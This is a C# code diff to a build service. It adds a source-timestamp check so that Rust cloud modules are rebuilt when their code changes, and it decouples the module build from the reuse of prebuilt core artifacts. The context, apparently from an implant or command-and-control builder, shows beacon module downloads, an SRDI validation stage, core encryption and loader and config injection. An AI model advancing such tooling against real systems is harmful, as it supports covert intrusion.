@@ -40,6 +40,35 @@ public partial class BuilderBuildService
         ["linux-x64"] = "linux",
     };
 
+    /// <summary>
+    /// 云模块是否可复用：产物齐全 且 模块源码没有比产物更新。
+    /// 任一模块缺失、或任一模块的 src/** 时间戳晚于对应产物 → false（需重建）。
+    /// </summary>
+    private static bool ModulesUpToDate(BuildContext ctx)
+    {
+        if (!Directory.Exists(ctx.ModulesDir))
+            return false;
+        foreach (var (moduleName, _) in CloudModules)
+        {
+            var artifact = Path.Combine(ctx.ModulesDir, $"{moduleName}.{ctx.ModuleExt}");
+            if (!System.IO.File.Exists(artifact))
+                return false;
+
+            // 源码时间戳校验：改模块代码后构建必须重编（否则旧 dll 被复用）
+            var srcDir = Path.Combine(RustAgentDir, "modules", moduleName);
+            if (Directory.Exists(srcDir))
+            {
+                var newestSrc = Directory.GetFiles(srcDir, "*.rs", SearchOption.AllDirectories)
+                    .Select(System.IO.File.GetLastWriteTimeUtc)
+                    .DefaultIfEmpty(DateTime.MinValue)
+                    .Max();
+                if (newestSrc > System.IO.File.GetLastWriteTimeUtc(artifact))
+                    return false;
+            }
+        }
+        return true;
+    }
+
     // Module name -> cdylib lib target name (as produced by cargo).
     // The deployed file is named {moduleName}.{ext} and is fetched by the
     // agent via /api/beacon/module/{moduleName}.
@@ -138,9 +167,8 @@ public partial class BuilderBuildService
             // ── Prebuilt artifacts? Skip compilation entirely. ──
             var artifactCore = Path.Combine(ArtifactsDir, req.Platform, "core.bin");
             var artifactKey = Path.Combine(ArtifactsDir, req.Platform, "core.key");
-            var modulesComplete = Directory.Exists(ctx.ModulesDir)
-                && ctx.ModulesDir.Count() > 0
-                && CloudModules.All(m => System.IO.File.Exists(Path.Combine(ctx.ModulesDir, $"{m.Module}.{ctx.ModuleExt}")));
+            // 模块产物完整 + 源码未更新才视为可用（缺文件或源码变更都会触发重建）
+            var modulesComplete = ModulesUpToDate(ctx);
 
             if (!forceRebuild && System.IO.File.Exists(artifactCore) && System.IO.File.Exists(artifactKey))
             {
@@ -198,15 +226,13 @@ public partial class BuilderBuildService
             {
                 buildSteps.Add(() => Stage1_BuildCoreAsync(ctx, targetArg, job));
                 buildSteps.Add(() => Stage1_5_ValidateSrdiAsync(ctx, job));
-                if (!modulesComplete)
-                    buildSteps.Add(() => Stage1_6_BuildModuleAsync(ctx, targetArg, job));
-                else
-                    job.Log($"Cloud modules already deployed for {req.Platform} — skipping module build");
             }
+            // 模块构建独立于 core 的 prebuilt 跳过：modules 缺失/过期时，
+            // 即使 core 走缓存也必须编译模块，否则 agent 模块下载 404。
+            if (!modulesComplete)
+                buildSteps.Add(() => Stage1_6_BuildModuleAsync(ctx, targetArg, job));
             else
-            {
-                job.Log("Cloud modules reused from platform directory");
-            }
+                job.Log($"Cloud modules already deployed for {req.Platform} — skipping module build");
             buildSteps.Add(() => Stage2_EncryptCoreAsync(ctx, job));
             buildSteps.Add(() => Stage3_PrepareLoaderAsync(ctx, targetArg, featuresArg, job));
             buildSteps.Add(() => Stage4_InjectConfigAsync(ctx, job));
